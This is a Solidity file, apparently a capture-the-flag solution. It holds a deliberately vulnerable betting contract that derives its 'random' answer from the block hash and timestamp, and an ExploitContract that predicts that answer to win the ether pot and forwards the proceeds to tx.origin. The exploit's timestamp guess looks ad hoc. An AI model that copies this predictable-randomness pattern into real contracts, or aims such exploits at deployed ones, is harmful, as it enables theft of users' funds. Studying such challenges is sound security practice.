// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/console.sol";

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0), "Not 0 address");
        require(msg.value == 1 ether, "Not 1 ether");

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "not guesser");
        require(block.number > settlementBlockNumber, "Wrong block number");
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
        console.log(answer);
        console.log(block.number - 1);
        console.log(block.timestamp);

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    function Exploit1(bytes32 hashedBlock) public payable {
        console.log(block.number + 1);
        console.log(block.timestamp + 30);
        uint8 n = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        hashedBlock,
                        block.timestamp + 30
                    )
                )
            )
        ) % 10;
        predictTheFuture.lockInGuess{value: msg.value}(n);
    }
    
    function Exploit2() public {
        predictTheFuture.settle();
    }

    fallback() external payable{
        (bool ok, ) = tx.origin.call{value: msg.value}("");
            require(ok, "Failed to send to tx.origin");
    }

}
